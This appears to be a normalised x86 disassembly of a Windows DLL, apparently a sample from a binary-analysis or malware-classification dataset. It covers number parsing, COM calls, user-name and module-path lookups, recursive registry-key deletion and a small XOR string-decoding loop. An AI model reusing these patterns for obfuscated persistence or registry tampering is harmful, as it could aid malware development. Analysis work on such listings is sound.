mov [ ebp - 0x54 ] ecx
lea ecx [ eax - 0x31 ]
cmp cl 0x8
ja r-xdata
mov [ ebp - 0x60 ] esi
jmp r-xdata
lea ecx [ eax - 0x31 ]
cmp cl 0x8
jbe r-xdata
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov [ ebp - 0x60 ] esi
xor ecx ecx
jmp r-xdata
cmp [ ebp - 0x58 ] 0x0
mov eax [ ebp - 0x70 ]
mov [ eax ] edx
je r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
push 0x3
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al bl
jge r-xdata
cmp al bl
jge r-xdata
jmp r-xdata
mov edx [ ebp - 0x54 ]
jmp r-xdata
push 0x4
jmp r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x9
jmp r-xdata
cmp al bl
je r-xdata
cmp al bl
jmp r-xdata
push 0xa
pop ecx
dec edx
movsx eax al
sub eax 0x2b
lea ecx [ edx - 0x1 ]
mov [ ebp - 0x54 ] ecx
je r-xdata
cmp al bl
jge r-xdata
mov [ ebp - 0x6c ] 0x4
jmp r-xdata
push 0x18
pop eax
cmp [ ebp - 0x4c ] eax
jbe r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x5
cmp al 0x2b
je r-xdata
push 0x4
jmp r-xdata
cmp al bl
je r-xdata
cmp al 0x39
jg r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
cmp al bl
je r-xdata
pop ecx
dec edx
jmp r-xdata
push 0x7
jmp r-xdata
dec eax
dec eax
je r-xdata
mov al [ edx ]
inc edx
sub al 0x31
cmp al 0x8
jbe r-xdata
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
xor ecx ecx
xor eax eax
xor edx edx
xor esi esi
cmp [ ebp - 0x4c ] 0x0
jbe r-xdata
cmp [ ebp - 0x9 ] 0x5
jl r-xdata
and [ ebp - 0x74 ] 0x0
push 0x2
pop ecx
jmp r-xdata
dec eax
dec eax
je r-xdata
dec edx
push 0xb
jmp r-xdata
cmp al 0x2d
je r-xdata
pop ecx
jmp r-xdata
mov ecx esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
cmp al 0x2b
je r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
dec [ ebp - 0x50 ]
mov al [ edx ]
inc edx
jmp r-xdata
or [ ebp - 0x68 ] 0xffffffff
push 0x7
pop ecx
jmp r-xdata
sub eax 0x3
dec edx
jmp r-xdata
push 0x8
jmp r-xdata
mov edx ecx
mov [ ebp - 0x64 ] ecx
jmp r-xdata
imul ecx ecx 0xa
movsx esi al
lea ecx [ ecx + esi - 0x30 ]
cmp ecx 0x1450
jg r-xdata
jmp r-xdata
dec edi
inc [ ebp - 0x50 ]
mov [ ebp - 0x4c ] eax
inc [ ebp - 0x9 ]
push 0x2
pop ecx
mov [ ebp - 0x74 ] 0x8000
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al bl
je r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
jmp r-xdata
cmp al 0x2d
je r-xdata
mov al [ edx ]
inc edx
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
dec [ ebp - 0x50 ]
cmp al bl
jge r-xdata
mov ecx 0x1451
mov al [ edx ]
inc edx
dec edi
cmp [ edi ] 0x0
je r-xdata
cmp al 0x43
jle r-xdata
mov al [ edx ]
inc edx
jmp r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
dec [ ebp - 0x4c ]
inc [ ebp - 0x50 ]
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x4c ]
lea eax [ ebp - 0x20 ]
push eax
call sub_10004757
mov eax [ ebp - 0x64 ]
xor edx edx
add esp 0xc
cmp [ ebp - 0x68 ] edx
jge r-xdata
cmp al 0x45
jle r-xdata
mov al [ edx ]
inc edx
add eax [ ebp - 0x50 ]
cmp [ ebp - 0x60 ] edx
jne r-xdata
neg eax
push 0x6
jmp r-xdata
sub al 0x64
cmp al 0x1
ja r-xdata
cmp [ ebp - 0x5c ] edx
jne r-xdata
add eax [ ebp + 0x18 ]
cmp eax 0x1450
jg r-xdata
sub eax [ ebp + 0x1c ]
xor esi esi
mov eax 0x7fff
mov edx 0x80000000
xor ecx ecx
mov [ ebp - 0x6c ] 0x2
jmp r-xdata
cmp eax 0xffffebb0
jl r-xdata
mov edi [ ebp - 0x78 ]
or eax [ ebp - 0x74 ]
mov [ edi ] cx
mov [ edi + 0xa ] ax
mov eax [ ebp - 0x6c ]
mov [ edi + 0x2 ] esi
mov [ edi + 0x6 ] edx
pop ebx
mov [ ebp - 0x6c ] 0x1
mov ecx rw-data
sub ecx 0x60
mov [ ebp - 0x54 ] eax
cmp eax edx
je r-xdata
mov eax [ ebp - 0x34 ]
movzx ecx [ ebp - 0x3c ]
mov esi [ ebp - 0x3a ]
mov edx [ ebp - 0x36 ]
shr eax 0x10
jmp r-xdata
jge r-xdata
cmp [ ebp + 0x14 ] edx
jne r-xdata
neg eax
mov ecx rw-data
mov [ ebp - 0x54 ] eax
sub ecx 0x60
cmp [ ebp - 0x54 ] edx
je r-xdata
xor eax eax
mov [ ebp - 0x3c ] ax
jmp r-xdata
mov eax [ ebp - 0x54 ]
sar [ ebp - 0x54 ] 0x3
add ecx 0x54
and eax 0x7
mov [ ebp - 0x7c ] ecx
cmp eax edx
je r-xdata
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
imul eax eax 0xc
lea ebx [ ecx + eax ]
mov eax 0x8000
cmp [ ebx ] ax
jb r-xdata
mov ecx [ ebp - 0x7c ]
xor edx edx
mov edx [ ebp - 0x32 ]
xor eax eax
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
movzx eax [ ebx + 0xa ]
mov esi eax
xor esi [ ebp - 0x32 ]
mov ecx 0x7fff
and edx ecx
and eax ecx
and esi 0x8000
mov edi 0x7fff
lea ecx [ eax + edx ]
mov [ ebp - 0x70 ] esi
movzx ecx cx
cmp dx di
jae r-xdata
mov esi ebx
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x46 ]
lea ebx [ ebp - 0x48 ]
xor eax eax
test si si
sete al
and [ ebp - 0x38 ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x3c ] 0x0
cmp ax di
jae r-xdata
mov edi 0xbffd
cmp cx di
ja r-xdata
mov esi 0x3fbf
cmp cx si
ja r-xdata
xor esi esi
cmp dx si
jne r-xdata
xor eax eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x3c ] eax
jmp r-xdata
cmp ax si
jne r-xdata
inc ecx
test [ ebp - 0x34 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x68 ] esi
lea edi [ ebp - 0x28 ]
mov [ ebp - 0x58 ] 0x5
inc ecx
test [ ebx + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x38 ] esi
jne r-xdata
add edi 0x2
inc [ ebp - 0x68 ]
dec [ ebp - 0x58 ]
cmp [ ebp - 0x58 ] 0x0
jg r-xdata
lea eax [ ebp + eax - 0x3c ]
mov [ ebp - 0x5c ] eax
lea eax [ ebx + 0x8 ]
mov [ ebp - 0x60 ] eax
cmp [ ebx + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x3c ] esi
jne r-xdata
mov eax [ ebp - 0x68 ]
mov edx [ ebp - 0x58 ]
add eax eax
mov [ ebp - 0x64 ] edx
test edx edx
jle r-xdata
add ecx 0xc002
test cx cx
jle r-xdata
mov [ ebp - 0x4c ] 0x1
cmp esi eax
jae r-xdata
cmp [ ebx ] esi
jne r-xdata
xor eax eax
mov [ ebp - 0x32 ] ax
jmp r-xdata
add ecx 0xffff
test cx cx
jns r-xdata
mov edi [ ebp - 0x24 ]
test edi edi
js r-xdata
add [ ebp - 0x5c ] 0x2
sub [ ebp - 0x60 ] 0x2
dec [ ebp - 0x64 ]
cmp [ ebp - 0x64 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x4c ] 0x0
mov [ edi - 0x4 ] esi
je r-xdata
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] esi
jmp r-xdata
mov eax 0x8000
cmp [ ebp - 0x2c ] ax
ja r-xdata
mov eax ecx
neg eax
movzx esi ax
add ecx esi
test cx cx
jg r-xdata
mov esi [ ebp - 0x28 ]
mov eax [ ebp - 0x2c ]
shl [ ebp - 0x2c ] 0x1
shr eax 0x1f
mov edx esi
add esi esi
or esi eax
shr edx 0x1f
lea eax [ edi + edi ]
or eax edx
add ecx 0xffff
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] eax
test cx cx
jg r-xdata
mov eax [ ebp - 0x60 ]
mov edx [ ebp - 0x5c ]
movzx edx [ edx ]
movzx eax [ eax ]
and [ ebp - 0x4c ] 0x0
imul eax edx
mov edx [ edi - 0x4 ]
lea esi [ edx + eax ]
cmp esi edx
jb r-xdata
cmp [ ebp - 0x2a ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x2c ]
and edx 0x1ffff
cmp edx 0x18000
jne r-xdata
mov eax [ ebp - 0x24 ]
mov edi [ ebp - 0x28 ]
mov edx [ ebp - 0x28 ]
shr [ ebp - 0x24 ] 0x1
shl eax 0x1f
shr edi 0x1
or edi eax
mov eax [ ebp - 0x2c ]
shl edx 0x1f
shr eax 0x1
or eax edx
dec esi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x2c ] eax
jne r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x2a ]
and [ ebp - 0x2a ] 0x0
cmp [ ebp - 0x26 ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp cx ax
jb r-xdata
test [ ebp - 0x2c ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] esi
je r-xdata
mov ax [ ebp - 0x2a ]
or ecx [ ebp - 0x70 ]
mov [ ebp - 0x3c ] ax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x3a ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x36 ] eax
mov [ ebp - 0x32 ] cx
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x70 ] ax
mov [ ebp - 0x38 ] eax
sete cl
mov [ ebp - 0x3c ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x34 ] ecx
jmp r-xdata
inc [ ebp - 0x26 ]
jmp r-xdata
and [ ebp - 0x26 ] 0x0
mov edx 0xffff
cmp [ ebp - 0x22 ] dx
jne r-xdata
or [ ebp - 0x2c ] 0x1
inc [ ebp - 0x22 ]
jmp r-xdata
mov [ ebp - 0x22 ] ax
inc ecx
jmp r-xdata
sub_10044720
push ebp
mov ebp esp
push 0xffffffff
push sub_100814ea
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
xor esi esi
mov [ ebp - 0x10 ] esi
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
push 0xffffffff
lea ecx [ edi + 0x4 ]
push esi
xor edx edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] esi
push eax
mov [ ecx ] dx
call sub_1001c310
mov [ ebp - 0x4 ] esi
lea esi [ edi + 0x20 ]
mov [ esi ] r--data
mov [ esi + 0x10 ] r--data
mov [ ebp + 0xc ] esi
mov [ esi + 0x60 ] r--data
mov eax 0x1
lea ebx [ esi + 0x18 ]
push ebx
mov [ ebp - 0x4 ] al
push esi
mov [ ebp - 0x10 ] eax
call sub_10050ac0
mov [ ebp - 0x4 ] 0x2
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
push ebx
mov [ esi + edx ] r--data
call sub_10066e80
xor eax eax
mov [ ebx + 0x3c ] eax
mov [ ebx + 0x40 ] eax
mov [ ebx ] r--data
mov [ edi + 0xc8 ] eax
mov [ edi + 0xcc ] eax
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_100447f0
push ebp
mov ebp esp
sub esp 0x210
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edx [ eax ]
push ecx
push eax
mov eax [ edx + 0x80 ]
call eax
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x88 ]
push edi
push eax
call edx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x70 ]
push 0x2000
push eax
call edx
lea eax [ ebp - 0x210 ]
push eax
lea ecx [ ebp - 0x20c ]
push ecx
mov [ ebp - 0x210 ] 0x208
call [ GetUserNameW@IAT ]
mov eax [ esi + 0x8 ]
mov edx [ eax ]
mov edx [ edx + 0x78 ]
push 0x0
lea ecx [ ebp - 0x20c ]
push ecx
push eax
call edx
mov [ esi ] eax
test eax eax
jns r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
mov eax [ esi ]
sub_1004488a
push 0x28
mov eax sub_1007e4e0
call sub_10050d0f
mov ebx [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x10 ] edi
cmp ebx edi
je r-xdata
push 0x5
pop eax
call sub_1001a1b3
retn
cmp [ ebx ] edi
jne r-xdata
push 0x14
call sub_1005ac7e
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] edi
cmp esi edi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
cmp ecx edi
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10062210
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100216c0
mov [ esi + 0x4 ] edi
mov [ esi ] r--data
push eax
mov ecx esi
mov [ ebp - 0x10 ] 0x1
mov [ esi + 0x8 ] edi
call sub_1001c782
jmp r-xdata
sub_10044912
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
push esi
push edi
mov esi ecx
cmp eax [ ebp + 0xc ]
jae r-xdata
sub eax [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
cmp eax edi
jae r-xdata
push r--data
call sub_1003b4a6
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx edi
ja r-xdata
mov edi eax
test edi edi
je r-xdata
push r--data
call sub_100616c6
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
push ebx
lea ebx [ eax + edi ]
push 0x0
push ebx
mov ecx esi
call sub_10064dae
test al al
je r-xdata
pop ebx
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov ecx [ ecx ]
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
lea edx [ edi + edi ]
push edx
mov edx [ ebp + 0xc ]
lea ecx [ ecx + edx * 2 ]
push ecx
mov ecx [ esi + 0x10 ]
lea eax [ eax + ecx * 2 ]
push eax
call sub_10078600
add esp 0xc
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] ebx
jb r-xdata
xor ecx ecx
mov [ eax + ebx * 2 ] cx
sub_100449b7
push 0x14
mov eax sub_1007e60b
call sub_10050d0f
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100067d1
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007a60
mov ecx [ ebp + 0x8 ]
push eax
call sub_100033a0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1002470e
mov eax edi
call sub_1001a1b3
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1002e942
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_1001c4b0
push edi
call sub_10009b69
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_10036aac
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002050e
sub_10044a54
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
push 0x3e
xor edx edx
pop ecx
div ecx
xor esi esi
lea eax [ edx * 4 + rw-data ]
mov [ ebp - 0x4 ] eax
test esi esi
jne r-xdata
mov eax [ ebx + 0x4 ]
cmp eax [ ebp + 0x8 ]
je r-xdata
push edi
push esi
push [ ebp - 0x4 ]
mov [ esi ] edi
call [ InterlockedCompareExchange@IAT ]
cmp eax edi
jne r-xdata
push 0xc
call sub_10028397
mov esi eax
pop ecx
test esi esi
je r-xdata
test esi esi
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
mov ebx edi
test edi edi
je r-xdata
mov eax [ esi + 0x8 ]
xor eax eax
jmp r-xdata
mov ebx [ ebp + 0x8 ]
push ebx
call sub_1007cd2f
pop ecx
mov [ esi + 0x8 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
jmp r-xdata
push [ esi + 0x8 ]
call sub_10015112
push esi
call sub_10020a90
pop ecx
pop ecx
pop edi
pop esi
pop ebx
leave
retn
push esi
call sub_10020a90
pop ecx
mov [ esi + 0x4 ] ebx
sub_10044af0
push esi
mov esi [ eax ]
test esi esi
je r-xdata
xor eax eax
pop esi
retn
push edi
mov edi [ lstrcmpW@IAT ]
mov edi edi
pop edi
mov eax esi
pop esi
retn
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
mov ecx [ ebx ]
mov eax [ esi ]
push ecx
mov ecx [ eax ]
push ecx
call edi
test eax eax
je r-xdata
sub_10044b20
push ebp
mov ebp esp
sub esp 0x220
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx ecx
test ebx ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax 0x1
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
test eax eax
jne r-xdata
push 0x104
lea ecx [ ebp - 0x220 ]
push ecx
push eax
call [ GetModuleFileNameW@IAT ]
test eax eax
jne r-xdata
mov eax 0x2
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x220 ]
push edx
call [ PathRemoveFileSpecW@IAT ]
lea eax [ ebp - 0x220 ]
push eax
call [ PathAddBackslashW@IAT ]
lea edx [ ebp - 0x18 ]
mov eax 0xea
call sub_1001bb80
lea ecx [ ebp - 0x220 ]
push ecx
push ebx
mov ecx 0x104
call sub_10067840
test eax eax
je r-xdata
mov eax 0x3
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push esi
lea edx [ ebp - 0x18 ]
push edx
mov esi 0x104
call sub_10030af0
neg eax
sbb eax eax
pop esi
and eax 0x5
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov eax 0x4
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_10044c30
push ebp
mov ebp esp
sub esp 0x630
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
push 0x410
lea eax [ ebp - 0x628 ]
push 0x0
push eax
call sub_10078970
add esp 0xc
push edi
push esi
call [ RegDeleteKeyW@IAT ]
test eax eax
jne r-xdata
lea ecx [ ebp - 0x630 ]
push ecx
push 0x20019
push 0x0
push edi
push esi
call [ RegOpenKeyExW@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x630 ]
push 0x0
push 0x0
push 0x0
push 0x0
lea edx [ ebp - 0x62c ]
push edx
lea eax [ ebp - 0x218 ]
push eax
push 0x0
push ecx
mov [ ebp - 0x62c ] 0x104
call [ RegEnumKeyExW@IAT ]
test eax eax
jne r-xdata
sub eax 0x2
neg eax
sbb eax eax
pop edi
and eax 0x2
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x630 ]
push ecx
call [ RegCloseKey@IAT ]
push edi
push esi
call [ RegDeleteKeyW@IAT ]
mov ecx [ ebp - 0x4 ]
neg eax
sbb eax eax
and eax 0xfffffffd
pop edi
xor ecx ebp
add eax 0x3
pop esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push ebx
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x30
and edx 0xff
mov [ ebp + eax * 2 - 0x10 ] dx
inc eax
cmp eax 0x5
jb r-xdata
lea ecx [ ebp - 0x218 ]
push ecx
lea edx [ ebp - 0x10 ]
xor eax eax
push edi
push edx
mov ecx 0x208
lea ebx [ ebp - 0x628 ]
mov [ ebp - 0x6 ] ax
call sub_100254a0
mov eax ebx
push eax
push esi
call sub_10044c30
add esp 0x14
test eax eax
je r-xdata
pop ebx
mov eax [ ebp - 0x630 ]
push 0x0
push 0x0
push 0x0
push 0x0
lea ecx [ ebp - 0x62c ]
push ecx
lea edx [ ebp - 0x218 ]
push edx
push 0x0
push eax
mov [ ebp - 0x62c ] 0x104
call [ RegEnumKeyExW@IAT ]
test eax eax
je r-xdata
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
sub_10044db3
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x5
push esi
push edi
ja r-xdata
xor eax eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
xor edi edi
inc edi
push edi
push 0x8
call sub_10025450
mov esi eax
pop ecx
pop ecx
test esi esi
jne r-xdata
push edi
push 0xd8
call sub_10025450
pop ecx
pop ecx
mov [ esi ] eax
test eax eax
jne r-xdata
call sub_10012991
mov [ eax ] 0xc
push edi
push 0x220
call sub_10025450
pop ecx
pop ecx
mov [ esi + 0x4 ] eax
test eax eax
jne r-xdata
push esi
call sub_10020a90
mov eax [ esi ]
mov ecx rw-data
call sub_10079dba
push [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov edx [ esi ]
call sub_1007a27f
pop ecx
test eax eax
jne r-xdata
push [ esi ]
call sub_10020a90
push esi
call sub_10020a90
pop ecx
jmp r-xdata
push [ esi + 0x4 ]
mov eax [ esi ]
push [ eax + 0x4 ]
call sub_10011bc8
pop ecx
pop ecx
test eax eax
je r-xdata
push [ esi ]
call sub_10015308
push [ esi ]
call sub_1000878a
push esi
call sub_10020a90
add esp 0xc
jmp r-xdata
pop ecx
jmp r-xdata
mov eax [ esi + 0x4 ]
mov [ eax ] edi
mov eax [ esi + 0x4 ]
mov [ eax ] edi
push [ esi + 0x4 ]
call sub_10020a90
push [ esi ]
call sub_10015308
push [ esi ]
call sub_1000878a
push esi
call sub_10020a90
add esp 0x10
xor esi esi
jmp r-xdata
pop edi
pop esi
pop ebp
retn
mov eax esi
jmp r-xdata
sub_10044ea8
push 0x4
mov eax sub_1007eb51
call sub_10050d0f
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] edi
mov [ esi ] ax
mov eax [ ebp + 0x10 ]
sub eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] edi
sar eax 0x1
mov [ ebp - 0x10 ] 0x1
je r-xdata
push edi
push eax
mov ecx esi
call sub_1002e78f
mov eax esi
call sub_1001a1b3
retn 0xc
lea ebx [ ecx + 0x8 ]
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
mov eax [ esi + 0x10 ]
cmp edx 0x8
jb r-xdata
cmp eax edi
ja r-xdata
push ebx
push [ ebp + 0x10 ]
lea eax [ ecx + eax * 2 ]
push [ ebp + 0xc ]
push eax
push edx
call sub_10017062
add esp 0x14
cmp eax [ esi + 0x10 ]
jbe r-xdata
push edi
push eax
mov ecx esi
call sub_1002e78f
mov edx [ esi + 0x14 ]
cmp edx 0x8
jb r-xdata
sub_10044f40
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0x1fffffff
ja r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_10052185
push r--data
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] r--data
call sub_1002050e
lea eax [ ecx * 8 ]
push eax
call sub_1005ac7e
add esp 0x4
test eax eax
jne r-xdata
sub_10044f94
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push [ ebp + 0xc ]
mov eax [ ecx ]
push [ ebp + 0x8 ]
lea edx [ ebp - 0x8 ]
push edx
call [ eax + 0xc ]
mov ecx eax
call sub_1005e57b
leave
retn 0x8
sub_10044fc0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi + 0x4 ]
push edi
mov edi [ ebp + 0x8 ]
push eax
push edi
call sub_10030ff0
mov ecx [ esi + 0x10 ]
push ecx
push edi
call sub_10030ff0
push esi
push edi
call sub_10030ff0
add esp 0x18
pop edi
pop esi
pop ebp
retn
sub_10045010
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx ecx
push edi
mov edi [ ebx + 0x4 ]
mov [ ebp - 0x28 ] ebx
test edi edi
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax 0x128
call sub_1000a6f0
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax 0x9c
call sub_1000a6f0
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push edi
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea eax [ ebx + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push ebx
push edi
push eax
mov [ esi + 0x4 ] eax
call sub_10078600
mov ebx [ ebp - 0x28 ]
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x4 ] 0x0
push ebx
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea ecx [ edi + 0x2 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
push edi
push ebx
push eax
mov [ esi + 0x8 ] eax
call sub_10078600
add esp 0xc
pop edi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x8 ] 0x0
mov ebx [ ebx + 0x8 ]
test ebx ebx
je r-xdata
sub_100450f0
push ebp
mov ebp esp
sub esp 0x50
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
lea edx [ ebp - 0x48 ]
push edx
lea edx [ ebp - 0x4c ]
push edx
push eax
mov eax [ ecx + 0xc ]
call eax
mov [ esi ] eax
test eax eax
jns r-xdata
push 0x30
lea eax [ ebp - 0x44 ]
push 0x0
push eax
call sub_10078970
add esp 0xc
lea ecx [ ebp - 0x14 ]
push ecx
call [ GetLocalTime@IAT ]
movzx eax [ ebp - 0x12 ]
mov cx [ ebp - 0x14 ]
mov dx [ ebp - 0xe ]
mov [ ebp - 0x40 ] cx
mov ecx [ ebp - 0xa ]
mov [ ebp - 0x3e ] ax
movzx eax [ ebp - 0xc ]
mov [ ebp - 0x3c ] dx
add ecx 0x2
mov [ ebp - 0x34 ] ax
mov eax [ ebp - 0x48 ]
mov [ ebp - 0x32 ] cx
